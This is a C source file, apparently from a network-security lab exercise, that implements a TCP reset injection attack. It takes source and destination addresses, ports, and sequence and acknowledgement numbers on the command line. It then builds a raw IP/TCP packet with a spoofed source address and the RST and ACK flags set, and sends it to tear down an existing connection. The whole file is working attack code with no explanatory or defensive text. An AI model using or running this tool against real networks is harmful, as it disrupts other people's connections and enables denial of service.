// attack2_rst.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include "checksum_helpers.h"

// TCP flags
#define TH_FIN  0x01
#define TH_SYN  0x02
#define TH_RST  0x04
#define TH_PUSH 0x08
#define TH_ACK  0x10
#define TH_URG  0x20

int main(int argc, char *argv[]) {

    if (argc != 7) {
        fprintf(stderr,
            "Usage: %s <src_ip> <dst_ip> <src_port> <dst_port> <seq> <ack>\n",
            argv[0]);
        exit(1);
    }

    const char *src_ip = argv[1];
    const char *dst_ip = argv[2];
    int src_port = atoi(argv[3]);
    int dst_port = atoi(argv[4]);
    unsigned long seq = strtoul(argv[5], NULL, 10);
    unsigned long ack = strtoul(argv[6], NULL, 10);

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) { perror("socket"); exit(1); }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    char packet[4096];
    memset(packet, 0, sizeof(packet));

    struct iphdr  *iph  = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));

    // IP header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = htons(rand());
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = inet_addr(src_ip);
    iph->daddr = inet_addr(dst_ip);
    iph->check = 0;

    // TCP header
    tcph->th_sport = htons(src_port);
    tcph->th_dport = htons(dst_port);
    tcph->th_seq  = htonl(seq);
    tcph->th_ack  = htonl(ack);
    tcph->th_off  = 5;
    tcph->th_flags = TH_RST | TH_ACK;
    tcph->th_win  = htons(65535);
    tcph->th_sum  = 0;
    tcph->th_urp  = 0;

    // checksums
    iph->check = csum_ip((unsigned short *)packet, sizeof(struct iphdr)/2);
    tcph->th_sum = csum_tcp((unsigned short *)packet, 0);

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dst_port);
    sin.sin_addr.s_addr = inet_addr(dst_ip);

    if (sendto(sock, packet,
               sizeof(struct iphdr) + sizeof(struct tcphdr),
               0,
               (struct sockaddr *)&sin, sizeof(sin)) < 0)
        perror("sendto");
    else
        printf("Spoofed RST+ACK sent.\n");

    close(sock);
    return 0;
}
